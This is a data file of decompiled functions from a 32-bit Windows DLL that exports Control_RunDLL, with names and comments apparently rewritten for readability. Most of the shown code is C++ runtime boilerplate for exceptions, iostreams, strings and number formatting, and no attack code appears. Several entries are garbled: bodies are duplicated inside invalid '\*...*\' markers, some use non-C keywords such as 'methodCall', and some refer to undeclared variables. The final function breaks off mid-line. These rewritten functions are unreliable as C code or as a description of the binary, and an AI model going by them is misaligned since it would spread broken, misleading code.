{"Function Name": "Control_RunDLL", "Address": "10001200", "Source Code": "undefined4 Control_RunDLL(undefined input_param_1, undefined input_param_2, undefined4 input_param_3)\n{\n    \n    code *function_pointer = (code *)retrieve_function_pointer(address, \"Control_RunDLL\");\n    \n    \n    return (function_pointer != (code *)0x0) ? (*function_pointer)() : 0xffffffff;\n}"}
{"Function Name": "FUN_100015c0", "Address": "100015c0", "Source Code": "void __cdecl FUN_100015c0(char *firstCharPtr, uint unsignedIntArg, char *secondCharPtr)\n{\n    \n    \n    \n    \n    \n    \n    FUN_10001580(firstCharPtr, unsignedIntArg, secondCharPtr, NULL, &localVarAddress);\n}"}
{"Function Name": "FUN_10001630", "Address": "10001630", "Source Code": "\\*\nundefined4 * __thiscall FUN_10001630(void *object, int source_param)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    \n    ___std_exception_copy((char **)(source_param + 4), (char **)((int)object + 4));\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10001630(void *object,int source_param)\n{\n    *(undefined ***)object = std::exception::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(source_param + 4),(char **)((int)object + 4));\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10001670", "Address": "10001670", "Source Code": "\\*\nundefined4 * __thiscall FUN_10001670(void *object, byte flag)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    ___std_exception_destroy((void **)((int)object + 4));\n    \n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10001670(void *object, byte flag)\n{\n    *(undefined ***)object = std::exception::vftable;\n    ___std_exception_destroy((void **)((int)object + 4));\n    if (flag & 1) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10001800", "Address": "10001800", "Source Code": "void __fastcall FUN_10001800(int *input_array)\n{\n    \n    void *previous_exception_list = exception_list;\n    \n    \n    exception_list = &previous_exception_list;\n    \n    \n    FUN_100150b5((int)input_array);\n    \n    \n    for (int index = 1; index <= 11; index += 2) {\n        \n        if ((void *)input_array[index] != (void *)0x0) {\n            \n            FUN_1001dc78((void *)input_array[index]);\n            \n            input_array[index] = 0;\n        }\n    }\n    \n    \n    FUN_10014d7c(input_array);\n    \n    \n    exception_list = previous_exception_list;\n    \n    \n    return;\n}"}
{"Function Name": "FUN_100018d0", "Address": "100018d0", "Source Code": "\\*\nundefined4 * __thiscall FUN_100018d0(void *object, int source_exception_data)\n{\n    \n    *(undefined ***)object = std::runtime_error::vftable;\n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    ___std_exception_copy((char **)(source_exception_data + 4), (char **)(undefined8 *)((int)object + 4));\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_100018d0(void *object,int source_exception_data)\n{\n    *(undefined ***)object = std::runtime_error::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(source_exception_data + 4),(char **)(undefined8 *)((int)object + 4));\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10001940", "Address": "10001940", "Source Code": "void __fastcall FUN_10001940(int *input_pointer)\n{\n    \n    uint xor_result = DAT_1004e008 ^ (uint)&stack_address;\n    \n    if (*input_pointer == 0) {\n        \n        std::_Lockit::_Lockit((_Lockit *)&critical_section_lock, 0);\n        \n        \n        if (*input_pointer == 0) {\n            \n            global_counter++;\n            \n            *input_pointer = global_counter;\n        }\n        \n        FUN_10014d7c(&critical_section_lock);\n    }\n    \n    \n    ___security_check_cookie_4(xor_result ^ (uint)&stack_address);\n}"}
{"Function Name": "FUN_100019d0", "Address": "100019d0", "Source Code": "void __fastcall FUN_100019d0(int input_param)\n{\n    undefined4 *result_pointer; \n    void *previous_exception_list = current_exception_list; \n    current_exception_list = &previous_exception_list; \n    if (*(int **)(input_param + 4) != (int *)0x0) { \n        result_pointer = (undefined4 *)(**(code **)(**(int **)(input_param + 4) + 8))(DAT_1004e008 ^ (uint)&stack_offset); \n        if (result_pointer != (undefined4 *)0x0) { \n            (**(code **)*result_pointer)(1); \n        }\n    }\n    current_exception_list = previous_exception_list; \n    return; \n}"}
{"Function Name": "FUN_10001a20", "Address": "10001a20", "Source Code": "\\*\nundefined1 * __fastcall FUN_10001a20(int param_1)\n{\n    \n    int retrieved_value = *(int *)(input_param + 4);\n    \n    \n    if (retrieved_value == 0) {\n        \n        return &DAT_100478cd;\n    }\n    \n    \n    if (*(undefined1 **)(retrieved_value + 0x18) != (undefined1 *)0x0) {\n        \n        return *(undefined1 **)(retrieved_value + 0x18);\n    }\n    \n    \n    return (undefined1 *)(retrieved_value + 0x1c);\n}\n*\\ \n \nundefined1 * __fastcall FUN_10001a20(int param_1)\n{\n    int retrieved_value = *(int *)(input_param + 4);\n    if (retrieved_value == 0) {\n        return &DAT_100478cd;\n    }\n    if (*(undefined1 **)(retrieved_value + 0x18) != (undefined1 *)0x0) {\n        return *(undefined1 **)(retrieved_value + 0x18);\n    }\n    return (undefined1 *)(retrieved_value + 0x1c);\n}"}
{"Function Name": "FUN_10001a40", "Address": "10001a40", "Source Code": "int method retrieveValue(void *context, uint index)\n{\n    \n    int offsetValue = *(int *)((int)context + 4);\n    int resultValue = 0; \n    \n    if (index < *(uint *)(offsetValue + 0xc)) {\n        \n        resultValue = *(int *)(*(int *)(offsetValue + 8) + index * 4);\n        \n        if (resultValue != 0) {\n            return resultValue;\n        }\n    }\n    \n    \n    if (*(char *)(offsetValue + 0x14) != '\\0') {\n        \n        offsetValue = FUN_10014f5d();\n        \n        if (index < *(uint *)(offsetValue + 0xc)) {\n            \n            return *(int *)(*(int *)(offsetValue + 8) + index * 4);\n        }\n    }\n    \n    \n    return resultValue;\n}"}
{"Function Name": "FUN_10001aa0", "Address": "10001aa0", "Source Code": "\\*\nbyte * __thiscall FUN_10001aa0(void *this, byte *start_ptr, byte *end_ptr)\n{\n    \n    int byte_difference = (int)end_ptr - (int)start_ptr;\n    \n    if (end_ptr < start_ptr) {\n        byte_difference = 0;\n    }\n    \n    for (int index = 0; index < byte_difference; index++) {\n        \n        *start_ptr = (byte)__Tolower((uint)*start_ptr, (_Ctypevec *)((int)this + 8));\n        \n        start_ptr++;\n    }\n    \n    return start_ptr;\n}\n*\\ \n \nbyte * __thiscall FUN_10001aa0(void *this, byte *start_ptr, byte *end_ptr)\n{\n    int byte_difference = (int)end_ptr - (int)start_ptr;\n    if (end_ptr < start_ptr) {\n        byte_difference = 0;\n    }\n    for (int index = 0; index < byte_difference; index++) {\n        *start_ptr = (byte)__Tolower((uint)*start_ptr, (_Ctypevec *)((int)this + 8));\n        start_ptr++;\n    }\n    return start_ptr;\n}"}
{"Function Name": "FUN_10001b10", "Address": "10001b10", "Source Code": "\\*\nbyte * __thiscall FUN_10001b10(void *this, byte *start_ptr, byte *end_ptr)\n{\n    \n    int byte_difference = (int)end_ptr - (int)start_ptr;\n    \n    if (end_ptr < start_ptr) {\n        byte_difference = 0;\n    }\n    \n    for (int index = 0; index < byte_difference; index++) {\n        \n        *start_ptr = (byte)__Toupper((uint)*start_ptr, (_Ctypevec *)((int)this + 8));\n        \n        start_ptr++;\n    }\n    \n    return start_ptr;\n}\n*\\ \n \nbyte * __thiscall FUN_10001b10(void *this, byte *start_ptr, byte *end_ptr)\n{\n    int byte_difference = (int)end_ptr - (int)start_ptr;\n    if (end_ptr < start_ptr) {\n        byte_difference = 0;\n    }\n    for (int index = 0; index < byte_difference; index++) {\n        *start_ptr = (byte)__Toupper((uint)*start_ptr, (_Ctypevec *)((int)this + 8));\n        start_ptr++;\n    }\n    return start_ptr;\n}"}
{"Function Name": "FUN_10001b70", "Address": "10001b70", "Source Code": "int FUN_10001b70(undefined8 *input_array, int offset, undefined8 *output_array)\n{\n    \n    FUN_10018670(output_array, input_array, offset - (int)input_array);\n    \n    \n    return offset;\n}"}
{"Function Name": "FUN_10001bb0", "Address": "10001bb0", "Source Code": "int FUN_10001bb0(undefined8 *source_pointer, int difference_value, undefined4 unused_param, undefined8 *destination_pointer)\n{\n    \n    \n    \n    \n    FUN_10018670(destination_pointer, source_pointer, difference_value - (int)source_pointer);\n    \n    \n    return difference_value;\n}"}
{"Function Name": "FUN_10001c40", "Address": "10001c40", "Source Code": "void __thiscall FUN_10001c40(void *object, undefined4 *array, undefined4 value)\n{\n    \n    array[0] = value;\n    \n    \n    array[1] = object;\n}"}
{"Function Name": "FUN_10001cd0", "Address": "10001cd0", "Source Code": "void __cdecl FUN_10001cd0(undefined4 *outputArray, undefined4 inputValue)\n{\n    int executionResult; \n    __acrt_ptd *threadData; \n    \n    executionResult = std::_Execute_once((once_flag *)&DAT_100504c0, FUN_10005650, &DAT_100504c4);\n    \n    \n    if (executionResult != 0) {\n        *outputArray = inputValue; \n        outputArray[1] = &DAT_100504c4; \n        return; \n    }\n    \n    \n    threadData = FUN_10029224();\n    \n    \n    code *functionPointer = *(code **)(threadData + 0xc);\n    \n    \n    if (functionPointer != (code *)0x0) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        (*functionPointer)(); \n    }\n    _abort(); \n}"}
{"Function Name": "FUN_10001fd0", "Address": "10001fd0", "Source Code": "\\*\nundefined4 * methodCall FUN_10001fd0(void *currentObject, byte flag)\n{\n    \n    *(undefined ***)currentObject = std::exception::vftable;\n    \n    ___std_exception_destroy((void **)((int)currentObject + 4));\n    \n    if (flag & 1) {\n        FUN_10013ceb(currentObject);\n    }\n    \n    return (undefined4 *)currentObject;\n}\n*\\ \n \nundefined4 * methodCall FUN_10001fd0(void *currentObject, byte flag)\n{\n    *(undefined ***)currentObject = std::exception::vftable;\n    ___std_exception_destroy((void **)((int)currentObject + 4));\n    if (flag & 1) {\n        FUN_10013ceb(currentObject);\n    }\n    return (undefined4 *)currentObject;\n}"}
{"Function Name": "FUN_10002010", "Address": "10002010", "Source Code": "undefined * FUN_10002010(undefined *error_buffer, int error_code)\n{\n    undefined8 *error_message; \n    if (error_code == 1) { \n        *(undefined4 *)(error_buffer + 0x10) = 0; \n        *(undefined4 *)(error_buffer + 0x14) = 0xf; \n        *error_buffer = 0; \n        FUN_10004010(error_buffer, (undefined8 *)\"iostream stream error\", (void *)0x15); \n        return error_buffer; \n    }\n    \n    error_message = (undefined8 *)std::_Syserror_map(error_code); \n    *(undefined4 *)(error_buffer + 0x10) = 0; \n    *(undefined4 *)(error_buffer + 0x14) = 0xf; \n    *error_buffer = 0; \n    FUN_10004010(error_buffer, error_message, (void *)(strlen((char *)error_message) + 1)); \n    return error_buffer; \n}"}
{"Function Name": "FUN_10002200", "Address": "10002200", "Source Code": "\\*\nundefined4 * __thiscall FUN_10002200(void *object, int error_data)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    \n    ___std_exception_copy((char **)(error_data + 4), (char **)((int)object + 4));\n    \n    \n    *(undefined ***)object = std::_System_error::vftable;\n    \n    \n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(error_data + 0xc);\n    \n    \n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(error_data + 0x10);\n    \n    \n    *(undefined ***)object = std::ios_base::failure::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10002200(void *object, int error_data)\n{\n    *(undefined ***)object = std::exception::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(error_data + 4), (char **)((int)object + 4));\n    \n    *(undefined ***)object = std::_System_error::vftable;\n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(error_data + 0xc);\n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(error_data + 0x10);\n    \n    *(undefined ***)object = std::ios_base::failure::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10002250", "Address": "10002250", "Source Code": "\\*\nundefined4 * __thiscall FUN_10002250(void *object, int source_param)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    \n    ___std_exception_copy((char **)(source_param + 4), (char **)((int)object + 4));\n    \n    \n    *(undefined ***)object = std::system_error::vftable;\n    \n    \n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(source_param + 0xc);\n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(source_param + 0x10);\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10002250(void *object,int source_param)\n{\n    *(undefined ***)object = std::exception::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(source_param + 4),(char **)((int)object + 4));\n    \n    *(undefined ***)object = std::system_error::vftable;\n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(source_param + 0xc);\n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(source_param + 0x10);\n    \n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_100022a0", "Address": "100022a0", "Source Code": "\\*\nundefined4 * __thiscall FUN_100022a0(void *object, int source_param)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    \n    ___std_exception_copy((char **)(source_param + 4), (char **)((int)object + 4));\n    \n    \n    *(undefined ***)object = std::_System_error::vftable;\n    \n    \n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(source_param + 0xc);\n    \n    \n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(source_param + 0x10);\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_100022a0(void *object, int source_param)\n{\n    *(undefined ***)object = std::exception::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(source_param + 4), (char **)((int)object + 4));\n    *(undefined ***)object = std::_System_error::vftable;\n    *(undefined4 *)((int)object + 0xc) = *(undefined4 *)(source_param + 0xc);\n    *(undefined4 *)((int)object + 0x10) = *(undefined4 *)(source_param + 0x10);\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10002490", "Address": "10002490", "Source Code": "void __fastcall FUN_10002490(void **arguments)\n{\n    void *firstElement = *arguments; \n    if (firstElement != (void *)0x0) { \n        void *previousElement = *(void **)((int)firstElement - 4); \n        \n        \n        if (0xfff < ((int)arguments[2] - (int)firstElement & 0xfffffffcU) &&\n            0x1f < (uint)((int)firstElement + (-4 - (int)previousElement))) {\n            FUN_1001dea6(); \n            ((code *)swi(3))(); \n            return; \n        }\n        FUN_10013ceb(previousElement); \n        *arguments = (void *)0x0; \n        arguments[1] = (void *)0x0; \n        arguments[2] = (void *)0x0; \n    }\n    return; \n}"}
{"Function Name": "FUN_100024f0", "Address": "100024f0", "Source Code": "void __fastcall FUN_100024f0(void **pointer_to_data)\n{\n    \n    if (*pointer_to_data != NULL) {\n        \n        FUN_1001dc78(*pointer_to_data);\n    }\n    \n    *pointer_to_data = NULL;\n}"}
{"Function Name": "FUN_10002510", "Address": "10002510", "Source Code": "void __thiscall FUN_10002510(void *this, uint param_1, char byteParam)\n{\n    \n    uint *pointerToUint = (uint *)((int)this + 0x10);\n    \n    \n    uint valueAtOffset14 = *(uint *)((int)this + 0x14);\n    \n    \n    uint valueAtOffset10 = *(uint *)((int)this + 0x10);\n    \n    if (param_1 <= valueAtOffset10) {\n        \n        if (0xf < valueAtOffset14) {\n            \n            this = *this;\n        }\n        \n        *pointerToUint = param_1;\n        \n        \n        *(undefined *)((int)this + param_1) = 0;\n        return;\n    }\n    \n    uint sizeDifference = param_1 - valueAtOffset10;\n    \n    \n    if (sizeDifference <= valueAtOffset14 - valueAtOffset10) {\n        \n        *pointerToUint = param_1;\n        \n        \n        if (0xf < valueAtOffset14) {\n            \n            this = *this;\n        }\n        \n        \n        _memset((void *)((int)this + valueAtOffset10), (int)byteParam, sizeDifference);\n        \n        \n        *(undefined *)((int)(void *)((int)this + valueAtOffset10) + sizeDifference) = 0;\n        return;\n    }\n    \n    param_1 = param_1 & 0xffffff00;\n    \n    \n    FUN_10004d30(this, sizeDifference, param_1, sizeDifference, byteParam);\n    return;\n}"}
{"Function Name": "FUN_10002920", "Address": "10002920", "Source Code": "void __fastcall FUN_10002920(int **input_pointer)\n{\n    uint modified_stack_pointer; \n    void *original_exception_list; \n    original_exception_list = current_exception_list; \n    modified_stack_pointer = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    current_exception_list = &original_exception_list; \n    if (!has_uncaught_exception()) { \n        process_input(*input_pointer); \n    }\n    int *function_pointer = *(int **)(*(int *)(**input_pointer + 4) + 0x38 + (int)*input_pointer); \n    if (function_pointer != (int *)0x0) { \n        (**(code **)(*function_pointer + 8))(modified_stack_pointer); \n    }\n    current_exception_list = original_exception_list; \n    return; \n}"}
{"Function Name": "FUN_10002990", "Address": "10002990", "Source Code": "int ** __thiscall FUN_10002990(void *this, int *param_1)\n{\n    int *intPointer; \n    uint xorResult;  \n    int paramValue;   \n    \n    xorResult = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    *(int **)this = param_1; \n    paramValue = *param_1; \n    \n    intPointer = *(int **)(*(int *)(paramValue + 4) + 0x38 + (int)param_1);\n    \n    \n    if (intPointer != (int *)0x0) {\n        \n        (**(code **)(*intPointer + 4))(xorResult);\n    }\n    \n    \n    if (((*(int *)(*(int *)(paramValue + 4) + 0xc + (int)param_1) == 0) &&\n        \n        (intPointer = *(int **)(*(int *)(paramValue + 4) + 0x3c + (int)param_1), intPointer != (int *)0x0)) &&\n        (intPointer != param_1)) {\n        \n        FUN_100041d0(intPointer);\n    }\n    \n    \n    *(bool *)((int)this + 4) = *(int *)(*(int *)(paramValue + 4) + 0xc + (int)param_1) == 0;\n    \n    \n    return (int **)this;\n}"}
{"Function Name": "FUN_10003330", "Address": "10003330", "Source Code": "void __thiscall FUN_10003330(void *this, uint param_1, char param_2)\n{\n    uint computedValue; \n    uint combinedValue; \n    \n    combinedValue = *(uint *)((int)this + 0xc) | param_1;\n    \n    \n    computedValue = (combinedValue | 4) * (*(int *)((int)this + 0x38) == 0) + combinedValue * (*(int *)((int)this + 0x38) != 0);\n    \n    FUN_10002180(this, computedValue, param_2);\n}"}
{"Function Name": "FUN_10003470", "Address": "10003470", "Source Code": "void __fastcall FUN_10003470(int **inputPointer)\n{\n    int *integerPointer; \n    void *previousExceptionList = currentExceptionList; \n    currentExceptionList = &previousExceptionList; \n    \n    integerPointer = *(int **)(*(int *)(**inputPointer + 4) + 0x38 + (int)*inputPointer);\n    \n    \n    if (integerPointer != (int *)0x0) {\n        \n        (**(code **)(*integerPointer + 8))(dataValue ^ (uint)&modifiedStackValue);\n    }\n    \n    currentExceptionList = previousExceptionList; \n    return; \n}"}
{"Function Name": "FUN_100034c0", "Address": "100034c0", "Source Code": "void __cdecl\nFUN_100034c0(undefined4 param_1, undefined4 *param_2, undefined4 param_3, int *param_4, byte param_5, int param_6)\n{\n    uint uVar3; \n    if (param_6 != 0) { \n        do {\n            if (param_4 == (int *)0x0) { \n                param_3 = CONCAT31(param_3._1_3_, 1); \n            } else {\n                if (*(int *)param_4[8] == 0) { \n                    uVar3 = (**(code **)(*param_4 + 0xc))(param_5); \n                } else {\n                    if (*(int *)param_4[0xc] >= 1) { \n                        *(int *)param_4[0xc] -= 1; \n                        byte *pbVar2 = *(byte **)param_4[8]; \n                        *(byte **)param_4[8] = pbVar2 + 1; \n                        *pbVar2 = param_5; \n                        uVar3 = (uint)param_5; \n                    } else {\n                        uVar3 = (**(code **)(*param_4 + 0xc))(param_5); \n                    }\n                }\n                if (uVar3 == 0xffffffff) { \n                    param_3 = CONCAT31(param_3._1_3_, 1); \n                }\n            }\n            param_6--; \n        } while (param_6 != 0); \n    }\n    param_2[1] = param_4; \n    *param_2 = param_3; \n    return; \n}"}
{"Function Name": "FUN_10003a10", "Address": "10003a10", "Source Code": "\\*\nundefined * __cdecl FUN_10003a10(undefined4 input_param, undefined *output_buffer, char *input_string, uint flags)\n{\n    undefined2 *output_pointer; \n    *output_buffer = 0x25; \n    char *current_position = output_buffer + 1; \n    \n    if ((flags & 0x20) != 0) {\n        *current_position++ = '+'; \n    }\n    \n    if ((flags & 8) != 0) {\n        *current_position++ = '#'; \n    }\n    \n    output_pointer = (undefined2 *)(current_position + 1); \n    \n    if (*input_string == 'L') {\n        *current_position++ = 'I'; \n        *output_pointer++ = 0x3436; \n    } else {\n        *current_position++ = *input_string; \n    }\n    \n    if ((flags & 0xe00) == 0x400) {\n        *(undefined *)output_pointer = 0x6f; \n        *(undefined *)((int)output_pointer + 1) = 0; \n    } \n    \n    else if ((flags & 0xe00) != 0x800) {\n        *(char *)output_pointer = input_string[1]; \n        *(undefined *)((int)output_pointer + 1) = 0; \n    } \n    \n    else {\n        *(byte *)output_pointer = ~((char)flags << 3) & 0x20U | 0x58; \n        *(undefined *)((int)output_pointer + 1) = 0; \n    }\n    \n    return output_buffer; \n}\n*\\ \n \nundefined * __cdecl FUN_10003a10(undefined4 input_param, undefined *output_buffer, char *input_string, uint flags)\n{\n    undefined2 *output_pointer;\n    *output_buffer = 0x25;\n    char *current_position = output_buffer + 1;\n    if ((flags & 0x20) != 0) {\n        *current_position++ = '+';\n    }\n    if ((flags & 8) != 0) {\n        *current_position++ = '#';\n    }\n    \n    output_pointer = (undefined2 *)(current_position + 1);\n    if (*input_string == 'L') {\n        *current_position++ = 'I';\n        *output_pointer++ = 0x3436;\n    } else {\n        *current_position++ = *input_string;\n    }\n    if ((flags & 0xe00) == 0x400) {\n        *(undefined *)output_pointer = 0x6f;\n        *(undefined *)((int)output_pointer + 1) = 0;\n    } else if ((flags & 0xe00) != 0x800) {\n        *(char *)output_pointer = input_string[1];\n        *(undefined *)((int)output_pointer + 1) = 0;\n    } else {\n        *(byte *)output_pointer = ~((char)flags << 3) & 0x20U | 0x58;\n        *(undefined *)((int)output_pointer + 1) = 0;\n    }\n    \n    return output_buffer;\n}"}
{"Function Name": "FUN_10003aa0", "Address": "10003aa0", "Source Code": "void __cdecl\nFUN_10003aa0(undefined4 param_1,undefined4 *param_2,undefined4 param_3,int *param_4,int param_5,\nbyte param_6,char *param_7,int *param_8)\n{\nchar cVar1;\nundefined4 uVar2;\ncode *pcVar3;\nint *piVar4;\nbyte bVar5;\nuint uVar6;\nlconv *plVar7;\nint *piVar8;\nundefined4 *puVar9;\nint *piVar10;\nundefined4 *****pppppuVar11;\nundefined4 *****pppppuVar12;\nchar *_Control;\nundefined8 *puVar13;\nint iVar14;\nundefined4 local_70;\nundefined4 local_6c;\nint *local_68;\nint *local_64;\nint *local_60;\nint local_5c;\nint local_58;\nint *local_54;\nint *local_50;\nundefined local_49;\nundefined4 *****local_48 [4];\nundefined4 local_38;\nuint local_34;\nundefined4 *****local_30 [4];\nint *local_20;\nint *local_1c;\nundefined2 local_18;\nuint local_14;\nvoid *local_10;\nundefined *puStack_c;\nundefined4 local_8;\nlocal_8 = 0xffffffff;\npuStack_c = &LAB_100380f0;\nlocal_10 = ExceptionList;\nuVar6 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nExceptionList = &local_10;\nlocal_5c = param_5;\nlocal_6c = param_7;\nlocal_68 = param_8;\nif ((param_8 == (int *)0x0) || ((*param_7 != '+' && (*param_7 != '-')))) {\nlocal_50 = (int *)0x0;\n}\nelse {\nlocal_50 = (int *)0x1;\n}\nif ((*(uint *)(param_5 + 0x14) & 0x3000) == 0x3000) {\n_Control = \"pP\";\nif ((((int *)((int)local_50 + 2U) <= param_8) && (param_7[(int)local_50] == '0')) &&\n(((param_7 + 1)[(int)local_50] == 'x' || ((param_7 + 1)[(int)local_50] == 'X')))) {\nlocal_50 = (int *)((int)local_50 + 2U);\n}\n}\nelse {\n_Control = \"eE\";\n}\nlocal_14 = uVar6;\nlocal_60 = (int *)_strcspn(param_7,_Control);\nlocal_18 = 0x2e;\nplVar7 = _localeconv();\nlocal_18 = CONCAT11(local_18._1_1_,*plVar7->decimal_point);\npiVar8 = (int *)_strcspn(param_7,(char *)&local_18);\niVar14 = local_5c;\nlocal_8 = 0;\nlocal_54 = *(int **)(*(int *)(local_5c + 0x30) + 4);\n(**(code **)(*local_54 + 4))(uVar6);\nlocal_8 = 1;\nlocal_64 = (int *)FUN_100043b0(&local_58);\nlocal_8 = 2;\nif ((local_54 != (int *)0x0) &&\n(puVar9 = (undefined4 *)(**(code **)(*local_54 + 8))(), puVar9 != (undefined4 *)0x0)) {\n(**(code **)*puVar9)(1);\n}\nlocal_8 = 0xffffffff;\nlocal_20 = (int *)0x0;\nlocal_1c = (int *)0xf;\nlocal_30[0] = (undefined4 *****)((uint)local_30[0] & 0xffffff00);\nFUN_100031f0(local_30,param_8,'\\0');\nlocal_8 = 3;\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\n(**(code **)(*local_64 + 0x1c))(local_6c,local_6c + (int)param_8,pppppuVar12);\nlocal_8._0_1_ = 4;\nlocal_54 = *(int **)(*(int *)(iVar14 + 0x30) + 4);\n(**(code **)(*local_54 + 4))();\nlocal_8._0_1_ = 5;\npiVar10 = (int *)FUN_10004b90((undefined (*) [16])&local_58);\nlocal_8._0_1_ = 6;\nif ((local_54 != (int *)0x0) &&\n(puVar9 = (undefined4 *)(**(code **)(*local_54 + 8))(), puVar9 != (undefined4 *)0x0)) {\n(**(code **)*puVar9)(1);\n}\nlocal_8._0_1_ = 3;\n(**(code **)(*piVar10 + 0x14))(local_48);\nlocal_8 = CONCAT31(local_8._1_3_,7);\nif ((undefined **)*piVar10 == std::numpunct<char>::vftable) {\nlocal_49 = *(undefined *)((int)piVar10 + 0xd);\n}\nelse {\nlocal_49 = (*(code *)((undefined **)*piVar10)[4])();\n}\npiVar4 = local_68;\nlocal_6c = (char *)CONCAT31(local_6c._1_3_,local_49);\nif (piVar8 != local_68) {\nif ((undefined **)*piVar10 == std::numpunct<char>::vftable) {\nbVar5 = *(byte *)(piVar10 + 3);\n}\nelse {\nbVar5 = (*(code *)((undefined **)*piVar10)[3])();\n}\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\n*(byte *)((int)pppppuVar12 + (int)piVar8) = bVar5;\n}\nif (piVar8 == piVar4) {\npiVar8 = local_60;\n}\npppppuVar12 = local_48;\nif (0xf < local_34) {\npppppuVar12 = local_48[0];\n}\ncVar1 = *(char *)pppppuVar12;\npiVar10 = local_20;\nwhile (((local_20 = piVar10, cVar1 != '\\x7f' && ('\\0' < cVar1)) &&\n((uint)(int)cVar1 < (uint)((int)piVar8 - (int)local_50)))) {\npiVar8 = (int *)((int)piVar8 - (int)cVar1);\nif (piVar10 < piVar8) {\nFUN_100043a0();\ngoto LAB_10003f3f;\n}\nif (local_1c == piVar10) {\nlocal_60 = (int *)((uint)local_60 & 0xffffff00);\nFUN_10005080(local_30,1,local_60,(uint)piVar8,1,(char)local_6c);\n}\nelse {\nlocal_20 = (int *)((int)piVar10 + 1);\npppppuVar11 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar11 = local_30[0];\n}\npuVar13 = (undefined8 *)((int)pppppuVar11 + (int)piVar8);\nFUN_10018bf0((undefined8 *)((int)puVar13 + 1),puVar13,(int)piVar10 + (1 - (int)piVar8));\n*(undefined *)puVar13 = local_49;\n}\npppppuVar11 = (undefined4 *****)((int)pppppuVar12 + 1);\nif (*(char *)((int)pppppuVar12 + 1) < '\\x01') {\npppppuVar11 = pppppuVar12;\n}\npppppuVar12 = pppppuVar11;\npiVar10 = local_20;\ncVar1 = *(char *)pppppuVar11;\n}\npiVar8 = *(int **)(local_5c + 0x20);\nif (((*(int *)(local_5c + 0x24) < 0) ||\n((*(int *)(local_5c + 0x24) < 1 && (piVar8 == (int *)0x0)))) || (piVar8 <= piVar10)) {\niVar14 = 0;\n}\nelse {\niVar14 = (int)piVar8 - (int)piVar10;\n}\nuVar6 = *(uint *)(local_5c + 0x14) & 0x1c0;\nif (uVar6 == 0x40) {\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\npuVar9 = (undefined4 *)\nFUN_10003540(param_1,&local_58,param_3,param_4,(byte *)pppppuVar12,(int)local_50);\npiVar8 = local_50;\n}\nelse if (uVar6 == 0x100) {\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\npuVar9 = (undefined4 *)\nFUN_10003540(param_1,&local_58,param_3,param_4,(byte *)pppppuVar12,(int)local_50);\npuVar9 = (undefined4 *)FUN_100034c0(param_1,&local_58,*puVar9,(int *)puVar9[1],param_6,iVar14);\niVar14 = 0;\npiVar8 = local_50;\n}\nelse {\npuVar9 = (undefined4 *)FUN_100034c0(param_1,&local_58,param_3,param_4,param_6,iVar14);\npiVar8 = local_50;\niVar14 = 0;\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\npuVar9 = (undefined4 *)\nFUN_10003540(param_1,&local_58,*puVar9,(int *)puVar9[1],(byte *)pppppuVar12,\n(int)local_50);\n}\npppppuVar12 = local_30;\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\n}\npuVar9 = (undefined4 *)\nFUN_10003540(param_1,&local_70,*puVar9,(int *)puVar9[1],\n(byte *)((int)pppppuVar12 + (int)piVar8),(int)piVar10 - (int)piVar8);\nuVar2 = *puVar9;\npiVar8 = (int *)puVar9[1];\n*(undefined4 *)(local_5c + 0x20) = 0;\n*(undefined4 *)(local_5c + 